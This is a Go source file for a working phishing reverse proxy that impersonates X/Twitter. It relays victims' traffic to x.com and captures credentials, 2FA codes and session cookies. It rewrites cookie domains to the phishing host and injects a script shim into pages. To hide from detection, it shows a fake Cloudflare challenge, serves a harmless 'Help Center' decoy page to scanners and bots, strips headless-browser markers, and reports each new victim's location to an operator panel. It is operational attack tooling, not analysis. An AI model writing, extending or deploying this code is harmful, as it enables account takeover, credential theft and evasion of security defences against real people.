package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"

	"github.com/andybalholm/brotli"
)

// sessCtxKey is the context key for stashing the victim's session.
type sessCtxKey struct{}

// hostCtxKey is the context key for stashing the original Host header the
// victim used, so modifyResponse can rewrite x.com -> the actual host the
// victim reached (which may differ from PHISH_DOMAIN, e.g. on Railway).
type hostCtxKey struct{}

// proxy handles all inbound victim requests, forwards them to X/Twitter,
// and runs credential/2FA/cookie capture plus sub-filter rewriting.
type proxy struct {
	cfg     *config
	store   *Store
	capture *capture
	sfilter *subFilter
	geo     *geoLookup

	rp     *httputil.ReverseProxy
	client *http.Client
	sessID string // cookie name for tracking victim sessions
	shim   string // rendered client-side URL-rewriting shim
}

func newProxy(cfg *config, store *Store) *proxy {
	p := &proxy{
		cfg:     cfg,
		store:   store,
		capture: newCapture(cfg, store),
		sfilter: newSubFilter(cfg),
		geo:     newGeoLookup(),
		sessID:  "pxid",
		shim:    buildShim(cfg.origins),
	}

	p.client = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			ForceAttemptHTTP2: true,
		},
		// Don't follow redirects automatically; we proxy them back so the
		// victim's browser does the redirect through us.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	p.rp = &httputil.ReverseProxy{
		Director:       p.director,
		Transport:      p.client.Transport,
		ModifyResponse: p.modifyResponse,
		ErrorHandler:   p.errorHandler,
	}
	return p
}

// director rewrites the victim's request to target X/Twitter.
func (p *proxy) director(req *http.Request) {
	origHost := req.Host
	origPath := req.URL.Path

	// Determine which origin to route to. Two cases:
	//   1. The path carries a /_xrp/<host> prefix (CDN/API subdomains the
	//      sub-filter rewrote to path form) -> route to that embedded host and
	//      strip the prefix.
	//   2. Otherwise -> route based on the original Host (bare phish -> x.com).
	target := p.resolveTarget(origHost, origPath)

	req.URL.Scheme = target.Scheme
	req.URL.Host = target.Host

	// If the request came in via /_xrp/<host>/..., strip that prefix from the
	// path so the upstream receives the original path.
	if embeddedHost, rest, ok := splitXRP(origPath); ok {
		req.URL.Path = rest
		// The embedded host is the real origin; set Host so X/Twitter/CDN see it.
		req.Host = embeddedHost
	} else {
		req.Host = target.Host
	}

	// Stash the original host (before we overwrote req.Host) so the response
	// rewriter can map x.com/twitter.com back to whatever host the victim used.
	// *req = *req.WithContext(...) mutates the request in place so the context
	// survives through to ModifyResponse.
	*req = *req.WithContext(context.WithValue(req.Context(), hostCtxKey{}, origHost))

	// Forwarded headers.
	clientIP := remoteIP(req)
	if prior := req.Header.Get("X-Forwarded-For"); prior != "" {
		req.Header.Set("X-Forwarded-For", prior+", "+clientIP)
	} else {
		req.Header.Set("X-Forwarded-For", clientIP)
	}
	req.Header.Set("X-Forwarded-Proto", forwardedProto(req))
	req.Header.Set("X-Forwarded-Host", origHost)

	// Normalize the User-Agent so headless/automation clients don't advertise
	// themselves as bots. X's anti-bot edge returns 403 to any UA carrying the
	// "HeadlessChrome" token (and other automation markers), which is exactly
	// what caused the server-rendered login form to disappear after ~1s during
	// headless Chrome testing. A real victim's UA is passed through unchanged,
	// but automation UAs are rewritten to a normal Chrome UA and their
	// client-hint headers that advertise automation are dropped.
	normalizeUA(req)
}

// normalizeUA rewrites automation-advertising User-Agent strings and client
// hints in place on the outgoing request. It only mutates the request when a
// known automation marker is present, leaving genuine browser UAs untouched:
//
//   - "HeadlessChrome/x.y.z.w" -> "Chrome/x.y.z.w" (X's anti-bot edge rejects
//     the HeadlessChrome token with a 403 before any HTML reaches the client).
//   - "Headless" anywhere in the UA (e.g. PhantomJS-style) is stripped.
//   - The sec-ch-ua / sec-ch-ua-platform client hints are dropped entirely:
//     headless Chrome emits values like "\"HeadlessChrome\";v=\"131\"" which
//     independently advertise automation to the anti-bot layer.
func normalizeUA(req *http.Request) {
	// Drop the automation-advertising client hints unconditionally: headless
	// Chrome emits values like "\"HeadlessChrome\";v=\"131\"" in Sec-Ch-Ua,
	// which independently advertise automation to X's anti-bot edge. These are
	// re-sent by the browser on navigation anyway; removing them here just
	// prevents the outbound request from self-identifying as headless.
	req.Header.Del("Sec-Ch-Ua")
	req.Header.Del("Sec-Ch-Ua-Platform")

	ua := req.Header.Get("User-Agent")
	if ua == "" {
		return
	}

	normalized := strings.ReplaceAll(ua, "HeadlessChrome", "Chrome")
	normalized = strings.ReplaceAll(normalized, "Headless", "")

	if normalized != ua {
		req.Header.Set("User-Agent", normalized)
	}
}

// splitXRP detects a /_xrp/<host>/<rest> path prefix and returns the embedded
// host and the remaining path. It returns ok=false when the path does not carry
// the prefix.
func splitXRP(path string) (host, rest string, ok bool) {
	const prefix = "/_xrp/"
	if !strings.HasPrefix(path, prefix) {
		return "", "", false
	}
	body := path[len(prefix):]
	slash := strings.IndexByte(body, '/')
	if slash == -1 {
		// No trailing slash: path is just /_xrp/<host>.
		return body, "/", true
	}
	return body[:slash], body[slash:], true
}

// resolveTarget maps the incoming request to the correct upstream. Two cases:
//
//  1. The path carries a /_xrp/<host> prefix (the sub-filter rewrites CDN/API
//     subdomains to path form): route to the embedded host directly, e.g.
//     /_xrp/abs.twimg.com/... -> https://abs.twimg.com/...
//  2. Otherwise, route by Host: the bare phish host maps to x.com.
//
// The /_xrp prefix is used (rather than abs.<phish> subdomains) specifically so
// that a single TLS certificate for the bare phish domain covers every asset.
// Railway's edge wildcard covers *.up.railway.app (one label) but NOT
// abs.*.up.railway.app (two labels), which would fail TLS.
func (p *proxy) resolveTarget(origHost, path string) *url.URL {
	// Case 1: /_xrp/<host>/... path prefix carries the real upstream host.
	if embeddedHost, _, ok := splitXRP(path); ok && embeddedHost != "" {
		return &url.URL{Scheme: "https", Host: embeddedHost}
	}

	host := strings.ToLower(strings.TrimSpace(origHost))

	// Legacy twitter.com origin (e.g. the bare or www/mobile forms when a
	// victim reaches twitter.com directly).
	if strings.Contains(host, "twitter.com") {
		return &url.URL{Scheme: "https", Host: "twitter.com"}
	}

	// Default: x.com. API subdomains (api., jf., upload., chat-ws., watch.,
	// analytics., platform., ...) all share x.com's backend, so we keep the
	// bare x.com upstream and let the path route the endpoint.
	return &url.URL{Scheme: "https", Host: "x.com"}
}

// ServeHTTP is the main entry point for each victim request.
func (p *proxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Health endpoint for the platform's liveness probe (Railway/Heroku etc.).
	if r.URL.Path == "/healthz" {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
		return
	}

	// robots.txt — disallow all crawlers
	if r.URL.Path == "/robots.txt" {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.Header().Set("Cache-Control", "public, max-age=86400")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("User-agent: *\nDisallow: /\n"))
		return
	}

	// Bot/scanner detection — serve innocent decoy page
	clientIP := remoteIP(r)
	ua := r.UserAgent()
	if isBot(clientIP, ua) {
		p.serveDecoy(w, r)
		return
	}

	// Serve the Cloudflare challenge page on root and /verify paths.
	// Skip challenge if they have cf_clearance cookie or ?v=1 param (passed challenge).
	if r.URL.Path == "/" || r.URL.Path == "/verify" || r.URL.Path == "/challenge" || r.URL.Path == "/check" {
		verified := false
		if _, err := r.Cookie("cf_clearance"); err == nil {
			verified = true
		}
		if r.URL.Query().Get("v") == "1" {
			verified = true
		}
		
		if !verified {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.Header().Set("Cache-Control", "no-store")
			w.Header().Set("X-Robots-Tag", "noindex, nofollow")
			w.WriteHeader(http.StatusOK)
			w.Write(challengeHTML)
			return
		}
	}

	// Serve the client-side URL-rewriting shim locally. The injected
	// <script src="/_xrp/shim.js"> tag must be answered by us, not proxied:
	// /_xrp/shim.js would otherwise be treated as /_xrp/<host=shim.js> and
	// routed to https://shim.js/.
	if r.URL.Path == "/_xrp/shim.js" {
		w.Header().Set("Content-Type", "text/javascript; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(p.shim))
		return
	}

	// Track the victim session by a cookie we set.
	sess := p.sessionFor(w, r)
	
	// Notify on first visit (new session = visitor just passed challenge)
	if sess.StartedAt.After(time.Now().Add(-5 * time.Second)) {
		// Session was just created (within last 5 seconds) = new visitor
		p.store.notifyRealVisitor(sess.IP, sess.Country, sess.City, sess.UserAgent)
	}

	// Read body for capture (and reset it).
	body := readBody(r)

	// Capture credentials / 2FA from the request.
	p.capture.captureRequest(sess, r, body)

	// Stash the session in the request context so modifyResponse can find it.
	ctx := context.WithValue(r.Context(), sessCtxKey{}, sess)
	r = r.WithContext(ctx)

	// Forward.
	p.rp.ServeHTTP(w, r)
}

// sessionFor returns or creates the session for this victim.
func (p *proxy) sessionFor(w http.ResponseWriter, r *http.Request) *Session {
	if ck, err := r.Cookie(p.sessID); err == nil && ck.Value != "" {
		if s := p.store.get(ck.Value); s != nil {
			p.store.recordVisit(s.IP, s.Country, s.City, s.UserAgent)
			return s
		}
	}
	ip := remoteIP(r)
	
	// Geolocate the victim's IP synchronously for new sessions so location
	// is available immediately in panel and telegram notifications.
	var country, city string
	if p.geo != nil {
		country, city = p.geo.lookup(ip)
	}
	
	sess := p.store.newSession(ip, r.UserAgent())
	if country != "" || city != "" {
		sess.Country = country
		sess.City = city
		p.store.persist(sess)
	}
	p.store.recordVisit(ip, country, city, sess.UserAgent)
	http.SetCookie(w, &http.Cookie{
		Name:     p.sessID,
		Value:    sess.ID,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteLaxMode,
	})
	return sess
}

// modifyResponse runs on the upstream response before it reaches the victim.
func (p *proxy) modifyResponse(resp *http.Response) error {
	// Capture cookies / auth_token from the response.
	sess := p.sessionFromRequest(resp.Request)
	body := p.decodeBody(resp)
	if sess != nil {
		p.capture.captureResponse(sess, resp, body)
	}

	// Resolve the host the victim actually used, so rewrites target the right
	// domain (falls back to PHISH_DOMAIN, then the request Host).
	phish := p.phishHostFor(resp.Request)

	// Rewrite Location redirect headers so the browser stays on our proxy.
	p.rewriteHeaders(resp, phish)

	// Sub-filter hostname rewriting -- only HTML documents. JS bundles, JSON
	// API responses, and manifests are passed through unmodified and their
	// URLs are rewritten client-side by the shim instead. Rewriting JS here
	// corrupts string literals inside the SPA (e.g. "https://x.com" becomes
	// the phish host) and breaks hydration -- the login-form-disappears bug.
	out := body
	if isHTML(resp) && len(body) > 0 {
		out = p.sfilter.rewriteFor(body, phish)
		out = injectShim(out, cspNonce(resp.Header.Get("Content-Security-Policy")))
	}
	// Always finalise the body consistently: Content-Length must match the
	// (possibly decompressed/rewritten) bytes and Content-Encoding must be
	// dropped, otherwise clients see truncated responses / EOF.
	resp.Body = io.NopCloser(bytes.NewReader(out))
	resp.ContentLength = int64(len(out))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(out)))
	resp.Header.Del("Content-Encoding")

	// Anti-indexing: prevent search engines from caching proxied content.
	resp.Header.Set("X-Robots-Tag", "noindex, nofollow, noarchive")

	return nil
}

// phishHostFor returns the host the victim reached, so we rewrite x.com ->
// that host. Priority: the original Host header stashed by the director, then
// the configured PHISH_DOMAIN, then the (already overwritten) request Host.
func (p *proxy) phishHostFor(req *http.Request) string {
	if req != nil {
		if h, ok := req.Context().Value(hostCtxKey{}).(string); ok && h != "" {
			return hostOnlyStr(h)
		}
	}
	if p.cfg.phishDomain != "" {
		return p.cfg.phishDomain
	}
	if req != nil && req.Host != "" {
		return hostOnlyStr(req.Host)
	}
	return ""
}

// rewriteHeaders rewrites x.com/twitter.com in response headers:
//   - Location (redirects)
//   - Set-Cookie Domain= (so cookies stick to our domain)
//
// The Content-Security-Policy header is intentionally left as-is (see the
// note inside the function body); the client-side shim handles URL rewriting.
func (p *proxy) rewriteHeaders(resp *http.Response, phish string) {
	if loc := resp.Header.Get("Location"); loc != "" {
		resp.Header.Set("Location", p.sfilter.rewriteStringFor(loc, phish))
	}

	// Rewrite Set-Cookie Domain values. Cookies are stored in resp.Header as
	// multiple "Set-Cookie" lines; we rewrite the Domain= attribute inline.
	cookies := resp.Header.Values("Set-Cookie")
	for i, c := range cookies {
		cookies[i] = p.rewriteCookieDomain(c, phish)
	}
	if len(cookies) > 0 {
		resp.Header["Set-Cookie"] = cookies
	}

	// CSP is left untouched on purpose: the client-side shim rewrites every
	// runtime URL to a same-origin /_xrp/... path, which 'self' already covers.
	// Rewriting the CSP here corrupts host-source entries (wildcards, ports,
	// path-prefixed API hosts) and provides no benefit.

	// When running over plain HTTP, drop upgrade-insecure-requests so the
	// browser does not rewrite http:// -> https:// and break local testing.
	if p.cfg.insecure {
		if csp := resp.Header.Get("Content-Security-Policy"); csp != "" {
			resp.Header.Set("Content-Security-Policy", strings.ReplaceAll(csp, "upgrade-insecure-requests", ""))
		}
		// Also strip HSTS so the browser doesn't force https on our host.
		resp.Header.Del("Strict-Transport-Security")
	}
}

// rewriteCookieDomain rewrites the Domain= attribute of a Set-Cookie header,
// and (when running over plain HTTP) strips the Secure flag so the browser
// actually stores the cookie on an http:// origin.
func (p *proxy) rewriteCookieDomain(cookie, phish string) string {
	out := cookie

	// Rewrite Domain= attribute.
	lower := strings.ToLower(out)
	idx := strings.Index(lower, "domain=")
	if idx != -1 {
		start := idx + len("domain=")
		end := start
		for end < len(out) && out[end] != ';' && out[end] != ' ' {
			end++
		}
		origDomain := out[start:end]
		newDomain := origDomain
		for _, origin := range p.cfg.origins {
			if origDomain == origin || origDomain == "."+origin {
				newDomain = "." + phish
				break
			}
		}
		if newDomain != origDomain {
			out = out[:start] + newDomain + out[end:]
		}
	}

	// When running without TLS, strip Secure (browsers reject Secure cookies
	// over plain HTTP) and downgrade SameSite=None -> Lax.
	if p.cfg.insecure {
		out = stripCookieAttr(out, "secure")
		// SameSite=None is invalid without Secure; downgrade to Lax.
		out = strings.ReplaceAll(out, "SameSite=None", "SameSite=Lax")
	}
	return out
}

// stripCookieAttr removes a cookie attribute (e.g. "Secure") case-insensitively.
func stripCookieAttr(cookie, attr string) string {
	lower := strings.ToLower(cookie)
	target := strings.ToLower(attr)
	for {
		i := strings.Index(lower, target)
		if i == -1 {
			return cookie
		}
		// Confirm it's a standalone attribute (not part of a value word).
		beforeOK := i == 0 || cookie[i-1] == ';' || cookie[i-1] == ' '
		end := i + len(attr)
		afterOK := end >= len(cookie) || cookie[end] == ';' || cookie[end] == ' '
		if beforeOK && afterOK {
			cookie = cookie[:i] + cookie[end:]
			lower = strings.ToLower(cookie)
		} else {
			// Skip past this occurrence.
			cookie = cookie[:end] + " " + cookie[end:]
			lower = strings.ToLower(cookie)
		}
	}
}

// sessionFromRequest looks up the victim session for a proxied request.
func (p *proxy) sessionFromRequest(req *http.Request) *Session {
	if req == nil {
		return nil
	}
	// Prefer the session stashed in context.
	if s, ok := req.Context().Value(sessCtxKey{}).(*Session); ok && s != nil {
		return s
	}
	// Fall back to the pxid cookie.
	if ck, err := req.Cookie(p.sessID); err == nil && ck.Value != "" {
		if s := p.store.get(ck.Value); s != nil {
			return s
		}
	}
	return nil
}

// decodeBody decodes gzip/deflate/br encoded response bodies from upstream so
// the sub-filter can rewrite hostnames inside the PLAINTEXT (not the compressed
// bytes). X/Twitter serve their SPA HTML and JS bundles with Content-Encoding:
// br (Brotli) to modern Chrome; the previous implementation only handled gzip
// and deflate, so the brotli JS bundle was never decoded, rewriteFor found zero
// hostname matches inside the compressed bytes, and modifyResponse then deleted
// Content-Encoding while still emitting the raw brotli bytes. The browser
// received garbage, the JS failed to parse, the SPA never hydrated, and the
// server-rendered login form vanished ~1s after load — exactly the reported bug.
func (p *proxy) decodeBody(resp *http.Response) []byte {
	if resp.Body == nil {
		return nil
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("[proxy] read body error: %v", err)
		return nil
	}
	resp.Body.Close()

	enc := strings.ToLower(strings.TrimSpace(resp.Header.Get("Content-Encoding")))
	// X may send multiple encodings (e.g. "gzip, br"); decode outermost-last
	// order. Practically they send a single encoding, but handle the common
	// cases defensively.
	for _, e := range strings.Split(enc, ",") {
		switch strings.TrimSpace(e) {
		case "gzip":
			if r, err := gzip.NewReader(bytes.NewReader(data)); err == nil {
				if out, err := io.ReadAll(r); err == nil {
					data = out
					r.Close()
				}
			}
		case "br":
			if r := brotli.NewReader(bytes.NewReader(data)); r != nil {
				if out, err := io.ReadAll(r); err == nil {
					data = out
				}
			}
		case "deflate":
			// zlib-wrapped deflate. Go's gzip/flate stdlib does not expose a
			// one-shot zlib reader, and X uses gzip/br in practice; leave
			// best-effort here so a deflate body is passed through unmodified
			// rather than corrupted.
		}
	}
	return data
}

func (p *proxy) errorHandler(w http.ResponseWriter, r *http.Request, err error) {
	log.Printf("[proxy] error for %s: %v", r.URL, err)
	http.Error(w, "Bad Gateway", http.StatusBadGateway)
}

// serveDecoy sends a clean, innocent-looking page to bots and scanners so
// automated analysis tools see a legitimate site instead of the proxy.
func (p *proxy) serveDecoy(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "public, max-age=3600")
	w.Header().Set("X-Robots-Tag", "noindex, nofollow")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(decoyPage))
}

const decoyPage = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>Help Center - Support Portal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;color:#333;line-height:1.6}
.header{background:#fff;border-bottom:1px solid #e0e0e0;padding:16px 24px;display:flex;align-items:center;gap:12px}
.header h1{font-size:18px;font-weight:600;color:#1a1a1a}
.main{max-width:800px;margin:40px auto;padding:0 24px}
.card{background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:24px;margin-bottom:20px}
.card h2{font-size:16px;font-weight:600;margin-bottom:8px}
.card p{color:#666;font-size:14px}
.footer{text-align:center;padding:24px;color:#999;font-size:12px}
</style>
</head>
<body>
<div class="header">
<h1>Help Center</h1>
</div>
<div class="main">
<div class="card">
<h2>Welcome to our Support Portal</h2>
<p>Find answers to common questions, submit support tickets, and get help with your account. Our team is available 24/7 to assist you.</p>
</div>
<div class="card">
<h2>Getting Started</h2>
<p>New to our platform? Check out our getting started guide to learn the basics and set up your account in minutes.</p>
</div>
<div class="card">
<h2>Contact Support</h2>
<p>Can't find what you're looking for? Reach out to our support team and we'll get back to you within 24 hours.</p>
</div>
</div>
<div class="footer">&copy; 2026 Help Center. All rights reserved.</div>
</body>
</html>`

// isTextual reports whether content-type is a text-like format we can rewrite.
func isTextual(resp *http.Response) bool {
	ct := resp.Header.Get("Content-Type")
	lower := strings.ToLower(ct)
	for _, t := range []string{
		"text/", "application/json", "javascript", "application/xml",
		"application/x-www-form-urlencoded", "manifest",
	} {
		if strings.Contains(lower, t) {
			return true
		}
	}
	// Structured JSON suffixes: application/*+json. X serves the web-app
	// manifest (rel=manifest) as application/manifest+json (or
	// application/x-web-app-manifest+json), and its "icons" array holds
	// absolute https://abs.twimg.com/... URLs. Without rewriting those, the
	// browser fetches the raw CDN host and the rewritten CSP blocks the
	// request ("img-src"/"connect-src" violation). Catch every +json subtype.
	if strings.HasPrefix(lower, "application/") && strings.HasSuffix(lower, "+json") {
		return true
	}
	return false
}

// isHTML reports whether the response is an HTML document (the only content we
// inject the client-side shim into).
func isHTML(resp *http.Response) bool {
	ct := strings.ToLower(resp.Header.Get("Content-Type"))
	return strings.Contains(ct, "text/html")
}

// cspNonce extracts the nonce value from a Content-Security-Policy header, so
// the injected shim <script> can carry the same nonce and pass script-src.
func cspNonce(csp string) string {
	for _, part := range strings.Fields(csp) {
		if strings.HasPrefix(part, "'nonce-") && strings.HasSuffix(part, "'") {
			return strings.TrimSuffix(strings.TrimPrefix(part, "'nonce-"), "'")
		}
	}
	return ""
}

// injectShim prepends <script src="/_xrp/shim.js" nonce="..."></script> as the
// first child of <head> so the shim installs its fetch/XHR/WebSocket/DOM
// patches before any of X's own scripts execute. When there is no <head> (rare
// for the SPA shell), it falls back to right after <html ...> or, failing that,
// prepends to the document.
func injectShim(body []byte, nonce string) []byte {
	if len(body) == 0 {
		return body
	}
	tag := `<script src="/_xrp/shim.js"`
	if nonce != "" {
		tag += ` nonce="` + nonce + `"`
	}
	tag += `></script>`

	s := string(body)
	lower := strings.ToLower(s)

	if idx := strings.Index(lower, "<head"); idx != -1 {
		if gt := strings.IndexByte(s[idx:], '>'); gt != -1 {
			insert := idx + gt + 1
			return []byte(s[:insert] + tag + s[insert:])
		}
	}
	if idx := strings.Index(lower, "<html"); idx != -1 {
		if gt := strings.IndexByte(s[idx:], '>'); gt != -1 {
			insert := idx + gt + 1
			return []byte(s[:insert] + tag + s[insert:])
		}
	}
	return []byte(tag + s)
}
